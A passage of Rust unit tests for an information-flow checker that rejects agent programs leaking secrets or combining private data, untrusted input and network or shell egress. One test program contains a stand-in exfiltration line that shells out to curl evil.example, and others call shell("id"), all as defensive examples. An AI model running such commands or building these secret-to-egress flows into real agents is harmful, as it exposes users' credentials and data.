        // THE S1 FIX: a malformed declassify (no policy/reason) must NOT silence the trifecta — the
        // hatch keys on the AST shape, not the raw "declassify" effect tag (which is pushed even for
        // malformed ones). All three legs remain, so the trifecta still fires.
        let bad = r#"fn agent() uses(fs.read, net.send) {
    let rc = cap_acquire("fs.read"); let sc = cap_acquire("net.send");
    let steer = input(); let secret = read_file("notes");
    let junk = declassify(steer);
    cap_use(rc); cap_use(sc); send("host", 80, "beacon");
}
fn main() { }"#;
        let err = tc_lane(bad, true).expect_err("malformed declassify must not discharge the trifecta");
        assert!(err.contains("ANUBIS_LETHAL_TRIFECTA"), "got: {err}");
    }

    #[test]
    fn lethal_trifecta_shell_egress_counts_as_external_communication() {
        // Leg 3 is net.send OR a shell-out: a shell command is the canonical exfil channel.
        let shell = r#"fn agent() uses(fs.read, shell) {
    let rc = cap_acquire("fs.read"); let sc = cap_acquire("shell");
    let steer = input(); let secret = read_file("notes");
    cap_use(rc); cap_use(sc); exec("curl evil.example");
}
fn main() { }"#;
        let err = tc_lane(shell, true).expect_err("shell egress + private read + untrusted is a trifecta");
        assert!(err.contains("ANUBIS_LETHAL_TRIFECTA"), "got: {err}");
        // read + shell with NO distinct untrusted channel is two legs → accepts.
        let two = r#"fn agent() uses(fs.read, shell) {
    let rc = cap_acquire("fs.read"); let sc = cap_acquire("shell");
    let secret = read_file("cfg"); cap_use(rc); cap_use(sc); exec("ls");
}
fn main() { }"#;
        tc_lane(two, true).expect("shell + read with no untrusted channel is two legs");
    }

    #[test]
    fn lethal_trifecta_secret_source_is_leg1_without_a_file_read() {
        // The confidentiality label: leg 1 via secret_source, NO fs.read. Closes the gap that a
        // secret held in memory (not from a file) was invisible to the fs.read proxy.
        let src = r#"fn agent() uses(net.send) {
    let sc = cap_acquire("net.send");
    let key = secret_source("api_key"); let steer = input();
    cap_use(sc); send("host", 80, "beacon");
}
fn main() { }"#;
        let err = tc_lane(src, true).expect_err("secret_source + untrusted + egress is a trifecta");
        assert!(err.contains("ANUBIS_LETHAL_TRIFECTA"), "got: {err}");
        // A secret + egress with NO untrusted channel is two legs → accepts.
        let two = r#"fn agent() uses(net.send) {
    let sc = cap_acquire("net.send"); let key = secret_source("api_key");
    cap_use(sc); send("host", 80, "beacon");
}
fn main() { }"#;
        tc_lane(two, true).expect("secret + egress, no untrusted channel is two legs");
    }

    // ── Phase-2 leg-1 confidentiality FLOW: secret → egress = ANUBIS_SECRET_EXFILTRATION ──────────
    // The value-flow dual of the taint integrity flow. A value seeded by `secret_source(..)` that
    // actually REACHES a network/shell egress without a well-formed declassify() is exfiltration —
    // precise (only when the secret value flows), flow-sensitive (set/clear on reassignment), and
    // control-flow-merged (may-secret across branches), exactly mirroring the taint machinery.

    #[test]
    fn secret_flows_to_egress_without_declassify_rejects() {
        // Direct: a secret sent over the network without release is exfiltration.
        let err = tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("api_key"); send("h", 80, k); }"#,
            false,
        )
        .expect_err("secret -> net egress must reject");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
        // Shell-out (exec) is an egress channel too — the canonical agent exfil path.
        let err = tc_lane(
            r#"fn main() uses(shell) { let s = secret_source("key"); exec(s); }"#,
            false,
        )
        .expect_err("secret -> shell egress must reject");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
        // Flow-sensitive SET: a clean var reassigned to a secret then sent (dual of the taint fail-open).
        let err = tc_lane(
            r#"fn main() uses(net.send) { let x = 5; x = secret_source("t"); send("h", 80, x); }"#,
            false,
        )
        .expect_err("reassign-to-secret then egress must reject");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
        // Control-flow merge: a secret assigned on ONE branch may-reaches the post-if egress.
        let err = tc_lane(
            r#"fn main(c: bool) uses(net.send) { let x = 5; if c { x = secret_source("t"); } send("h", 80, x); }"#,
            false,
        )
        .expect_err("branch reassign-to-secret then egress must reject");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
    }

    #[test]
    fn secret_egress_accept_edges_are_precise() {
        // Declassify hatch: a well-formed declassify (policy AND reason) releases the secret.
        tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("api_key"); send("h", 80, declassify(k, "redact", "reviewed")); }"#,
            false,
        )
        .expect("declassified secret may egress");
        // Flow-sensitive CLEAR: a secret reassigned to a clean constant before egress accepts.
        tc_lane(
            r#"fn main() uses(net.send) { let x = secret_source("k"); x = 42; send("h", 80, x); }"#,
            false,
        )
        .expect("secret cleared before egress accepts");
        // Precision: a secret HELD but never sent (a literal is egressed instead) does not fire.
        tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("k"); send("h", 80, "beacon"); }"#,
            false,
        )
        .expect("a held-but-not-sent secret accepts");
        // Named boundary: a secret to a LOCAL file (fs.write) is not network/shell egress this slice.
        tc_lane(
            r#"fn main() uses(fs.write) { let k = secret_source("k"); write_file("/tmp/x", k); }"#,
            false,
        )
        .expect("secret to local write is out of egress scope this slice");
    }

    #[test]
    fn secret_egress_malformed_declassify_still_rejects() {
        // A declassify missing its reason is not a valid release (AST-shape keyed, like the taint
        // side) — the secret still leaks. The program also raises the missing-policy/reason error;
        // the point here is that the confidentiality check is NOT hatched by a malformed declassify.
        let err = tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("api_key"); send("h", 80, declassify(k)); }"#,
            false,
        )
        .expect_err("malformed declassify does not hatch the secret");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
    }

    // ── Phase-2 INTERPROCEDURAL: secret return summary + leg-2 exposure summary (twinned slice) ──

    #[test]
    fn secret_through_a_helper_reaches_egress_rejects() {
        // The secret is minted inside a helper and returned; compute_secret_fns marks it, so the
        // egress check fires even with no secret_source in `main` — the dual of the return-taint summary.
        let err = tc_lane(
            r#"fn get_key() { return secret_source("k"); }
fn main() uses(net.send) { send("h", 80, get_key()); }"#,
            false,
        )
        .expect_err("secret returned from a helper and egressed must reject");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
        // Transitive: a helper that returns another secret-returning helper's value is also secret.
        let err = tc_lane(
            r#"fn a() { return secret_source("k"); }
fn b() { return a(); }
fn main() uses(net.send) { send("h", 80, b()); }"#,
            false,
        )
        .expect_err("transitively-returned secret must reject");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
    }

    #[test]
    fn secret_egress_interproc_accept_edges_are_precise() {
        // Discard-arg precision: `ignore` receives the secret but returns a constant, so the shared
        // param_return_taint summary says no param reaches the return — no false positive at egress.
        tc_lane(
            r#"fn ignore(x) { return 0; }
fn main() uses(net.send) { let k = secret_source("k"); send("h", 80, ignore(k)); }"#,
            false,
        )
        .expect("a secret discarded by a helper does not reach egress");
        // A helper that neither mints nor forwards a secret is not marked, so its result egresses clean.
        tc_lane(
            r#"fn constant() { return 42; }
fn main() uses(net.send) { send("h", 80, constant()); }"#,
            false,
        )
        .expect("a non-secret helper result egresses clean");
        // Pass-through IS carried (a true positive, not a false one): wrap returns its secret arg.
        let err = tc_lane(
            r#"fn wrap(x) { return x; }
fn main() uses(net.send) { send("h", 80, wrap(secret_source("k"))); }"#,
            false,
        )
        .expect_err("a pass-through helper forwards the secret to egress");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
    }

    #[test]
    fn trifecta_legs_reached_through_helpers_reject() {
        // Both leg 1 (secret via get_key -> secret_fns) and leg 2 (untrusted input via get_steer ->
        // leg2_fns) are reached through helpers; net.send is leg 3; a constant beacon is sent (pure
        // coexistence). The verified-lane trifecta now fires though neither leg is direct in `agent`.
        let src = r#"fn get_key() { return secret_source("api_key"); }
fn get_steer() { return input(); }
@verified
fn agent() uses(net.send) {
    let sc = cap_acquire("net.send");
    let key = get_key();
    let steer = get_steer();
    cap_use(sc);
    send("host", 80, "beacon");
}
fn main() { }"#;
        let err = tc_lane(src, true).expect_err("interprocedural trifecta legs must reject");
        assert!(err.contains("ANUBIS_LETHAL_TRIFECTA"), "got: {err}");
    }

    // (The read_file/leg-2 conflation accept-guard is proven precisely at the module level in
    // trifecta.rs — `compute_leg2_fns_marks_input_helper_transitively_but_never_a_file_reader`
    // asserts a file-reading helper is NEVER put in leg2_fns — rather than end-to-end here, where a
    // file-reading helper trips the orthogonal verified-lane capability checks it would need to
    // satisfy, which would obscure the property under test.)

    #[test]
    fn trifecta_declassify_barrier_holds_across_a_helper_accepts() {
        // Accept-bias: a helper that SANITIZES its untrusted read via a well-formed declassify is not
        // a leg-2 exposer, so an agent with legs 1 (secret) + 3 (net.send) but only that sanitized
        // helper as its "channel" has no distinct leg 2 → NOT a trifecta → accepts. (Before the fix,
        // compute_leg2_fns descended past the declassify and falsely marked the helper leg-2.)
        let src = r#"fn sanitize() { let s = declassify(input(), "policy", "reviewed"); return s; }
@verified
fn agent() uses(net.send) {
    let sc = cap_acquire("net.send");
    let key = secret_source("api_key");
    let clean = sanitize();
    cap_use(sc);
    send("host", 80, "beacon");
}
fn main() { }"#;
        tc_lane(src, true).expect("a helper that declassifies its input is not a leg-2 channel");
    }

    // ── Phase-2 COMPOSITE / aggregate flow: containers + control-flow value exprs carry the label ──

    #[test]
    fn taint_laundered_through_a_container_is_caught() {
        // Array: a tainted element taints the container reaching the sink.
        tc_ok(r#"fn main() uses(net.send) { let t = input(); send("h", 80, [t]); }"#)
            .expect_err("tainted array element reaching a sink must be flagged");
        // Nested: an array of arrays still carries (the aggregate arms recurse to any depth).
        tc_ok(r#"fn main() uses(net.send) { let t = input(); send("h", 80, [[t]]); }"#)
            .expect_err("tainted element nested in a container must be flagged");
        // Precision (accept-bias): a container of clean values is genuinely clean.
        tc_ok(r#"fn main() uses(net.send) { send("h", 80, [1, 2, 3]); }"#)
            .expect("a clean container accepts");
    }

    #[test]
    fn secret_laundered_through_a_container_is_caught() {
        // Confidentiality dual: a secret in a container reaching egress.
        tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("k"); send("h", 80, [k]); }"#,
            false,
        )
        .expect_err("secret array element reaching egress must reject");
        // Interprocedural: a pass-through helper that WRAPS the arg in a container still carries it —
        // the aggregate arms in the shared param_return_taint summary catch `fn wrap(x){ return [x]; }`.
        let err = tc_lane(
            r#"fn wrap(x) { return [x]; }
fn main() uses(net.send) { send("h", 80, wrap(secret_source("k"))); }"#,
            false,
        )
        .expect_err("secret wrapped-then-returned through a helper must reject");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
        // The declassify hatch composes with containers: a declassified secret inside `[...]` is released.
        tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("k"); send("h", 80, [declassify(k, "p", "r")]); }"#,
            false,
        )
        .expect("a declassified secret inside a container is released");
    }

    // ── Phase-2 SCOPE-AWARE control-flow value exprs: match/if/if-let/block walked soundly ───────

    #[test]
    fn taint_through_a_control_flow_value_is_caught() {
        // If-expression branch: the tainted value is selected by a branch.
        tc_ok(r#"fn main() uses(net.send) { let t = input(); let f = true; let r = if f { t } else { 0 }; send("h", 80, r); }"#)
            .expect_err("tainted value through an if-expression branch must be flagged");
        // Block-local `let` passthrough: the binding chain inside the branch launders nothing.
        tc_ok(r#"fn main() uses(net.send) { let t = input(); let f = true; let r = if f { let v = t; v } else { 0 }; send("h", 80, r); }"#)
            .expect_err("tainted value through a block-local let must be flagged");
        // Tail-position match in a helper: the return summary walks control-flow tails now
        // (the retired tail-`if`/`match` return-summary boundary).
        tc_ok(r#"fn get_data() { let t = input(); match t { _ => t } }
fn main() uses(net.send) { send("h", 80, get_data()); }"#)
            .expect_err("a helper whose tail match returns taint must be flagged at the call");
    }

    #[test]
    fn secret_through_a_control_flow_value_is_caught() {
        // Match pattern destructure: `Some(inner) => inner` of a secret scrutinee carries.
        let err = tc_lane(
            r#"fn main() uses(net.send) { let s = Some(secret_source("k")); let i = match s { Some(inner) => inner, _ => 0 }; send("h", 80, i); }"#,
            false,
        )
        .expect_err("secret destructured out of a match arm must reject");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
        // If-let: the then-branch's pattern var inherits the scrutinee's secrecy.
        tc_lane(
            r#"fn main() uses(net.send) { let s = Some(secret_source("k")); let r = if let Some(v) = s { v } else { 0 }; send("h", 80, r); }"#,
            false,
        )
        .expect_err("secret through an if-let pattern var must reject");
        // Interprocedural: a passthrough helper built from a match summarizes {0}, so the secret
        // is caught at the call boundary.
        tc_lane(
            r#"fn pick(x) { return match x { _ => x }; }
fn main() uses(net.send) { send("h", 80, pick(secret_source("k"))); }"#,
            false,
        )
        .expect_err("param destructured through a match arm must flow to the return summary");
        // A block `Assign` SETS: `{ x = secret; x }` in a branch carries (the set half of the
        // straight-line Assign discipline inside the block walker).
        tc_lane(
            r#"fn main() uses(net.send) { let x = 0; let f = true; let r = if f { x = secret_source("k"); x } else { 0 }; send("h", 80, r); }"#,
            false,
        )
        .expect_err("assign-to-secret inside a value branch must reject");
    }

    #[test]
    fn control_flow_value_shadow_and_reassign_precision_accepts() {
        // THE shadowing regression this slice closes correctly: an arm's pattern var shadowing a
        // same-named outer SECRET binding is the arm's own clean binding (the composite slice's
        // first attempt shipped exactly this false positive; the adversarial review caught it).
        tc_lane(
            r#"fn main() uses(net.send) { let key = secret_source("k"); let sel = Some(1); let picked = match sel { Some(key) => key, _ => 0 }; send("h", 80, picked); }"#,
            false,
        )
        .expect("a clean pattern var shadowing an outer secret must accept (no false positive)");
        // Taint dual: a block-local `let x` shadowing an outer tainted `x` is clean.
        tc_ok(r#"fn main() uses(net.send) { let x = input(); let f = true; let r = if f { let x = 7; x } else { 0 }; send("h", 80, r); }"#)
            .expect("a clean block-local let shadowing an outer tainted binding must accept");
        // The design-review blocker guard: straight-line reassign-to-clean INSIDE a value branch
        // clears (the committed reassign-to-clean contract, now honored in value position).
        tc_ok(r#"fn main() uses(net.send) { let x = input(); let f = true; let r = if f { x = 42; x } else { 99 }; send("h", 80, r); }"#)
            .expect("reassign-to-clean inside a value branch must stay accepted");
        // Declassify inside a branch releases (the hatch composes with control flow).
        tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("k"); let f = true; let p = if f { declassify(k, "p", "r") } else { 0 }; send("h", 80, p); }"#,
            false,
        )
        .expect("a declassified secret inside a branch is released");
        // Plain precision: a clean match value to a sink accepts.
        tc_ok(r#"enum Choice { A, B }
fn main() uses(net.send) { let c = Choice::A; let v = match c { Choice::A => 1, Choice::B => 2, _ => 0 }; send("h", 80, v); }"#)
            .expect("a clean match value accepts");
    }

    // ── Phase-2 buried-sink: sink/egress/capability CALLS inside control-flow value exprs enforced ──

    #[test]
    fn buried_sink_in_control_flow_is_enforced() {
        // Taint sink buried in an if-expression branch.
        tc_ok(r#"fn main() uses(net.send) { let t = input(); let f = true; let r = if f { send("h", 80, t) } else { 0 }; }"#)
            .expect_err("a tainted sink buried in an if branch must be flagged");
        // Sink buried in a match arm body (statement-position match).
        tc_ok(r#"fn main() uses(net.send) { let t = input(); let c = 1; match c { _ => send("h", 80, t) }; }"#)
            .expect_err("a tainted sink buried in a match arm must be flagged");
        // Secret egress buried in a non-tail block statement.
        let err = tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("x"); let f = true; let r = if f { let _z = send("h", 80, k); 0 } else { 0 }; }"#,
            false,
        )
        .expect_err("a secret egress buried in a block statement must reject");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
    }

    #[test]
    fn buried_privileged_call_is_a_capability_bypass_now_closed() {
        // CAPABILITY LAUNDERING: a network send with NO uses(net.send), buried in an if branch, was
        // accepted (the effect never registered). Now the descent registers it -> forbidden in Safe.
        let err = tc_ok(r#"fn main() { let f = true; let r = if f { send("h", 80, "x") } else { 0 }; }"#)
            .expect_err("a buried send without uses(net.send) must be forbidden in safe mode");
        assert!(err.contains("ANUBIS_EFFECT_FORBIDDEN_IN_MODE"), "got: {err}");
        // Shell dual.
        tc_ok(r#"fn main() { let f = true; let r = if f { shell("id") } else { 0 }; }"#)
            .expect_err("a buried shell without uses(shell) must be forbidden in safe mode");
        // A declared capability makes the buried clean call accept (precision).
        tc_ok(r#"fn main() uses(net.send) { let f = true; let r = if f { send("h", 80, "beacon") } else { 0 }; }"#)
            .expect("a buried clean send with the capability declared accepts");
    }

    #[test]
    fn buried_sink_interproc_param_summary_sees_control_flow() {
        // A helper whose param reaches a sink ONLY through a match arm now summarizes that param as a
        // sink, so the call site fires ANUBIS_INTERPROC_SINK on a tainted argument.
        let err = tc_ok(
            r#"fn log(x) uses(net.send) { let c = 1; match c { _ => send("h", 80, x) }; }
fn main() uses(net.send) { log(input()); }"#,
        )
        .expect_err("a param reaching a sink through a match arm must be summarized and caught");
        assert!(err.contains("ANUBIS_INTERPROC_SINK"), "got: {err}");
        // A helper that does NOT route its param to the sink stays clean (precision).
        tc_ok(
            r#"fn pick(x) { return match x { _ => 0 }; }
fn main() uses(net.send) { send("h", 80, pick(input())); }"#,
        )
        .expect("a helper that discards its param through the match accepts");
    }

    #[test]
    fn buried_sink_accept_bias_holds() {
        // Declassify buried in a branch releases the secret before egress.
        tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("x"); let f = true; let r = if f { send("h", 80, declassify(k, "p", "r")) } else { 0 }; }"#,
            false,
        )
        .expect("a declassified secret sunk inside a branch is released");
        // Reassign-to-clean before a buried sink clears (the set/CLEAR block-walker discipline).
        tc_ok(r#"fn main() uses(net.send) { let t = input(); let f = true; let r = if f { t = 42; send("h", 80, t) } else { 0 }; }"#)
            .expect("reassign-to-clean before a buried sink stays accepted");
        // Shadowing: an arm pattern var over an outer secret, sunk, is the arm's own CLEAN binding.
        tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("x"); let sel = Some(1); let r = match sel { Some(k) => send("h", 80, k), _ => 0 }; }"#,
            false,
        )
        .expect("a clean pattern var shadowing an outer secret, sunk in the arm, accepts");
        // Buried read_file needs no capability (Safe-allowed by default).
        tc_ok(r#"fn main() { let f = true; let r = if f { read_file("cfg") } else { 0 }; }"#)
            .expect("a buried read_file is Safe-allowed and needs no capability");
    }

    // ── Phase-2 confidentiality param→egress-sink dual (ANUBIS_INTERPROC_EXFILTRATION) ──────────

    #[test]
    fn secret_into_egressing_helper_param_is_caught() {
        // A helper whose param reaches a network egress, called with a secret → caught at the boundary.
        let err = tc_lane(
            r#"fn leak(x) uses(net.send) { send("h", 80, x); }
fn main() uses(net.send) { leak(secret_source("k")); }"#,
            false,
        )
        .expect_err("secret into a param that reaches an egress must reject");
        assert!(err.contains("ANUBIS_INTERPROC_EXFILTRATION"), "got: {err}");
        // Shell egress dual (shell ∈ is_egress_sink but ∉ is_sink — genuinely needs the egress summary).
        let err = tc_lane(
            r#"fn leak(x) uses(shell) { shell(x); }
fn main() uses(shell) { leak(secret_source("k")); }"#,
            false,
        )
        .expect_err("secret into a param that reaches a shell egress must reject");
        assert!(err.contains("ANUBIS_INTERPROC_EXFILTRATION"), "shell dual: got: {err}");
        // Transitive: a → b → egress.
        let err = tc_lane(
            r#"fn b(y) uses(net.send) { send("h", 80, y); }
fn a(x) uses(net.send) { b(x); }
fn main() uses(net.send) { a(secret_source("k")); }"#,
            false,
        )
        .expect_err("secret through a transitive egress chain must reject");
        assert!(err.contains("ANUBIS_INTERPROC_EXFILTRATION"), "transitive: got: {err}");
        // The arg may itself be a secret-returning helper (consults secret_fns, like the direct check).
        let err = tc_lane(
            r#"fn get_key() { return secret_source("k"); }
fn leak(x) uses(net.send) { send("h", 80, x); }
fn main() uses(net.send) { leak(get_key()); }"#,
            false,
        )
        .expect_err("a secret-returning helper passed into an egressing param must reject");
        assert!(err.contains("ANUBIS_INTERPROC_EXFILTRATION"), "secret-helper arg: got: {err}");
    }

    #[test]
    fn secret_into_egressing_helper_accept_bias() {
        // Declassified argument releases (expr_secret_source → None).
        tc_lane(
            r#"fn leak(x) uses(net.send) { send("h", 80, x); }
fn main() uses(net.send) { leak(declassify(secret_source("k"), "p", "r")); }"#,
            false,
        )
        .expect("a declassified secret into an egressing param is released");
        // LOCAL write is NOT egress — a secret into a write_file helper must accept (egress-only scope).
        tc_lane(
            r#"fn store(x) uses(fs.write) { write_file("log", x); }
fn main() uses(fs.write) { store(secret_source("k")); }"#,
            false,
        )
        .expect("a secret into a LOCAL-write param is not exfiltration (egress-only)");
        // Discard helper: the param does not reach the egress → not summarized.
        tc_lane(
            r#"fn ignore(x) uses(net.send) { send("h", 80, "literal"); }
fn main() uses(net.send) { ignore(secret_source("k")); }"#,
            false,
        )
        .expect("a param that never reaches the egress is not flagged");
        // A clean (non-secret) argument to an egressing helper accepts.
        tc_ok(r#"fn leak(x) uses(net.send) { send("h", 80, x); }
fn main() uses(net.send) { leak("public"); }"#)
            .expect("a non-secret argument to an egressing helper accepts");
    }

    #[test]
    fn interproc_egress_and_sink_are_orthogonal_labels() {
        // A TAINT source into an egressing helper fires the integrity interproc sink, NOT exfiltration
        // (input() is taint-not-secret) — the two interprocedural checks are disjoint by label.
        let err = tc_ok(
            r#"fn leak(x) uses(net.send) { send("h", 80, x); }
fn main() uses(net.send) { leak(input()); }"#,
        )
        .expect_err("taint into an egressing param fires the integrity interproc sink");
        assert!(err.contains("ANUBIS_INTERPROC_SINK"), "got: {err}");
        assert!(!err.contains("ANUBIS_INTERPROC_EXFILTRATION"), "taint must not fire exfiltration: {err}");
    }

    // ── Phase-2: param_return_taint soundness — forwarder helpers that return a secret param ───────

    #[test]
    fn param_return_summary_catches_forwarder_leaks() {
        // A secret param that reaches a helper's RETURN through a construct the summary used to drop
        // (non-Var assign target, conditional local->return, a method/CallExpr, a destructuring let)
        // is now caught: send(fwd(secret_source())) is exfiltration. Each helper is called at its exact
        // arity and the specific confidentiality diagnostic is asserted.
        let cases = [
            // (helper body, exact call)
            (r#"fn fwd(k) { let buf = [0, 0]; buf[0] = k; return buf; }"#, r#"fwd(secret_source("k"))"#),
            (r#"fn fwd(x, c) { let r = 0; if c { r = x; } return r; }"#, r#"fwd(secret_source("k"), true)"#),
            (r#"fn fwd(x) { return x.clone(); }"#, r#"fwd(secret_source("k"))"#),
            (r#"fn fwd(x) { let [a, b] = [x, 0]; return a; }"#, r#"fwd(secret_source("k"))"#),
            (r#"fn fwd(x) { return x; }"#, r#"fwd(secret_source("k"))"#), // control: passthrough
        ];
        for (body, call) in cases {
            let src = format!("{body}\nfn main() uses(net.send) {{ send(\"h\", 80, {call}); }}");
            let err = tc_ok(&src).expect_err(&format!("forwarder leak not caught for body: {body}"));
            assert!(
                err.contains("ANUBIS_SECRET_EXFILTRATION"),
                "body {body}: expected ANUBIS_SECRET_EXFILTRATION, got: {err}"
            );
        }
    }

    #[test]
    fn direct_callexpr_launder_is_caught() {
        // The intra-procedural twin: `s.clone()` (a CallExpr on a secret) egressed is exfiltration —
        // the direct expr_secret_source now has a CallExpr arm mirroring the summary walker.
        let err = tc_ok(r#"fn main() uses(net.send) { let s = secret_source("k"); send("h", 80, s.clone()); }"#)
            .expect_err("a method-call launder of a secret must be caught");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
    }

    #[test]
    fn param_return_summary_accept_bias() {
        // A helper that does NOT return its secret param accepts (no over-summarization of a discard).
        tc_ok(r#"fn fwd(x) { return 0; }
fn main() uses(net.send) { send("h", 80, fwd(secret_source("k"))); }"#)
            .expect("a param-discarding helper does not make its caller leak");
    }

    // ── Phase-2: the secret<T> qualifier — auto-label a value secret without secret_source() ───────

    #[test]
    fn secret_qualifier_param_and_let_are_labelled() {
        // A secret<T> param that egresses is exfiltration — no secret_source() call needed.
        let err = tc_ok(r#"fn f(x: secret<u64>) uses(net.send) { send("h", 80, x); }
fn main() { }"#)
            .expect_err("a secret<T> param egressed is exfiltration");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
        // A secret<T> let annotation, likewise.
        tc_ok(r#"fn main() uses(net.send) { let k: secret<u64> = 42; send("h", 80, k); }"#)
            .expect_err("a secret<T> let egressed is exfiltration");
        // A declassify on the secret<T> value releases it (accept).
        tc_ok(r#"fn f(x: secret<u64>) uses(net.send) { send("h", 80, declassify(x, "p", "r")); }
fn main() { }"#)
            .expect("a declassified secret<T> value is released");
    }

    #[test]
    fn secret_qualifier_flows_through_block_and_return() {
        // A secret<T> block-local let inside a value-position block (seed_effect_let mirror site).
        tc_ok(r#"fn main() uses(net.send) { let r = if true { let k: secret<u64> = 5; send("h", 80, k); 0 } else { 0 }; }"#)
            .expect_err("a secret<T> block-local let egressed is exfiltration");
        // A locally-minted secret<T> that is RETURNED makes the fn secret-returning
        // (seed_one_let_secret mirror site → compute_secret_fns), so an egress of its result is caught.
        let err = tc_ok(r#"fn getk() -> u64 { let k: secret<u64> = 5; return k; }
fn main() uses(net.send) { send("h", 80, getk()); }"#)
            .expect_err("a returned secret<T> local flows interprocedurally to the egress");
        assert!(err.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {err}");
    }

    #[test]
    fn secret_qualifier_param_is_trifecta_leg1() {
        // A secret<T> param is PRIVATE DATA (leg-1): with a distinct untrusted channel + an egress and
        // NO value flow, it forms the lethal trifecta (the no-flow steering case) — the confidentiality
        // dual of a tainted<T> param supplying leg-2. Corpus-safe (no committed program uses secret<T>).
        let err = tc_ok(r#"fn agent(k: secret<u64>) uses(net.send) { let steer = input(); send("h", 80, "beacon"); }
fn main() { }"#)
            .expect_err("a secret<T> param + untrusted input + egress forms the lethal trifecta");
        assert!(err.contains("ANUBIS_LETHAL_TRIFECTA"), "got: {err}");
        // Two legs only (secret param + egress, no untrusted channel) accepts.
        tc_ok(r#"fn agent(k: secret<u64>) uses(net.send) { send("h", 80, "beacon"); }
fn main() { }"#)
            .expect("secret param + egress with no untrusted channel is two legs");
    }

    // ── Phase-2: effect-walk NON-control-flow compound exprs (buried-in-compound enforcement) ──────

    #[test]
    fn buried_call_in_compound_expr_is_enforced() {
        // Capability laundering closed for the value-shape wrappers: a privileged call buried in a
        // cast / aggregate / binary operand / index, with no `uses(...)`, is forbidden in Safe.
        for src in [
            r#"fn main() { let x = shell("id") as u64; }"#,
            r#"fn main() { let x = [shell("id")]; }"#,
            r#"fn main() { let x = send("h", 80, "beacon") + 1; }"#,
            r#"fn main() { let arr = [1, 2, 3]; let x = arr[shell("id")]; }"#,
            // Closure/method application ARGS are concrete call-site exprs, so a buried call there
            // is walked (only the Lambda BODY stays opaque).
            r#"fn id(f) { return f; } fn main() { let y = id(0)(shell("id")); }"#,
        ] {
            let err = tc_ok(src).expect_err("a privileged call buried in a compound expr must be forbidden");
            assert!(err.contains("ANUBIS_EFFECT_FORBIDDEN_IN_MODE"), "src={src} got: {err}");
        }
        // A tainted value sunk through a call buried in an aggregate is caught.
        tc_ok(r#"fn main() uses(net.send) { let t = input(); let x = [send("h", 80, t)]; }"#)
            .expect_err("a tainted sink buried in an aggregate must be flagged");
    }

    #[test]
    fn buried_call_in_compound_expr_accept_bias() {
        // The capability is declared → a buried privileged call accepts (precision).
        tc_ok(r#"fn main() uses(shell) { let x = shell("id") as u64; }"#)
            .expect("a buried privileged call with the capability declared accepts");
        // read_file is Safe-allowed → a buried read_file needs no capability.
        tc_ok(r#"fn main() { let x = [read_file("cfg")]; }"#)
            .expect("a buried read_file is Safe-allowed");
        // A declassify inside an aggregate releases the secret.
        tc_lane(
            r#"fn main() uses(net.send) { let k = secret_source("x"); send("h", 80, [declassify(k, "p", "r")]); }"#,
            false,
        )
        .expect("a declassified secret in an aggregate is released");
        // Clean compound expressions accept.
        tc_ok(r#"struct W { f: u64 }
fn main() { let w = W { f: 7 }; let arr = [1, 2, 3]; let y = arr[1]; }"#)
            .expect("clean compound expressions accept");
    }

    #[test]
    fn control_flow_walk_is_mirror_symmetric_across_labels() {
        // The same destructure shape must be caught by BOTH walkers (review Lens-C guard: the
        // taint pattern seeder must set `tainted` + `taint_source` TOGETHER — the `Var` arm gates
        // on both — or the integrity side leaks one-sided while the secrecy side still catches).
        tc_ok(r#"fn main() uses(net.send) { let s = Some(input()); let i = match s { Some(inner) => inner, _ => 0 }; send("h", 80, i); }"#)
            .expect_err("taint side of the destructure mirror must be flagged");
        tc_lane(
            r#"fn main() uses(net.send) { let s = Some(secret_source("k")); let i = match s { Some(inner) => inner, _ => 0 }; send("h", 80, i); }"#,
            false,
        )
        .expect_err("secret side of the destructure mirror must be flagged");
    }

    // ── Phase-2 taint soundness: the reassignment fail-open (control-flow-merge dataflow) ────────

    #[test]
    fn taint_reassignment_to_tainted_closes_the_fail_open() {
        // Straight-line: a clean var reassigned to untrusted input then sent — the reproduced hole.
        tc_ok(r#"fn main() uses(net.send) { let x = 5; x = input(); send("h", 80, x); }"#)
            .expect_err("reassign-to-tainted then sink must be flagged");
        // Through a branch: may-taint merge makes x tainted after the if.
        tc_ok(r#"fn main(c: bool) uses(net.send) { let x = 5; if c { x = input(); } send("h", 80, x); }"#)
            .expect_err("branch reassign-to-tainted then sink must be flagged");
    }

    #[test]
    fn container_place_assignment_does_not_launder_taint_or_secret() {
        // A non-`Var` place-assignment (`buf[0] = k`, `obj.f = k`) MAY-updates the ROOT container binding
        // (set-only, whole-binding granularity). Before the fix an untrusted/secret value written into an
        // element launders past the sink/egress check because the container stayed clean.
        // (integrity) tainted input stored into an array element, then read into a sink.
        tc_ok(r#"fn main() { let u = input(); let buf = ["ok","ok"]; buf[0] = u; sink(buf[0]); }"#)
            .expect_err("tainted array-element write then sink must be flagged");
        // (confidentiality) secret stored into an element, then the container egressed.
        tc_ok(r#"fn main() uses(net.send) { let k: secret<u64> = 42424242; let a = [0,0]; a[0] = k; send("h", 80, a); }"#)
